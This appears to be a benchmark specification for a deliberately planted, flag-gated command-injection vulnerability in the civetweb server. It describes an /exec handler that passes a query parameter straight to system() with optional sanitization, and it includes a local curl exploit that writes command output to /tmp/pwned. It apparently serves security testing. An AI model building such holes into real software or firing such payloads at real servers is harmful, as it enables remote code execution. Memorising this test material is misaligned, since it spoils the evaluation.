DESCRIPTION:
  CLI-flag-gated command injection vulnerability in civetweb standalone server.
  The /exec endpoint is registered via mg_set_request_handler() in main.c.
  The server must be started with the appropriate gate flags for the endpoint
  to be reachable; without them it returns 404.

CONFIG_GATE (C1 (simple)):
  mechanism:  CLI flag --exec-mode, stored in global int exec_mode
  check:      single boolean guard: if (!exec_mode) return 404
  complexity: one condition, one flag, no struct

INPUT_FLOW (I1 (direct)):
  entry:      HTTP GET /exec?cmd=<payload>
  path:       raw value after cmd= passed directly to system()
  transforms: none

SANITIZATION (S3 (configurable, bypass by omitting --strict-exec)):
  mechanism:  --strict-exec flag enables blocking of pipe, semicolon, backtick
  bypass:     omit --strict-exec when starting the server;
              without it, no sanitization is applied

SINK:        system() in exec_handler() (src/main.c)

CHANGED FILES:
  src/main.c -- 4 hunks:
    1. globals:  added exec_mode, exec_strict
    2. handler:  exec_handler() with I1 flow and S3 conditional sanitization
    3. prescan:  prescan_exec_args() handles --exec-mode and --strict-exec
    4. start:    prescan call + handler registration

EXPLOIT:
  build:   bash build.sh
  start:   ./civetweb --exec-mode -listening_ports 18046 -document_root /tmp
  trigger: curl 'http://127.0.0.1:18046/exec?cmd=id%3E/tmp/pwned'
  verify:  cat /tmp/pwned
  bypass:  omit --strict-exec (default: no sanitization)
  blocked: ./civetweb --exec-mode --strict-exec ... => semicolon returns 403

NOTES:
  Without --strict-exec any shell metacharacter works. With it, pipe/semicolon/backtick are blocked.
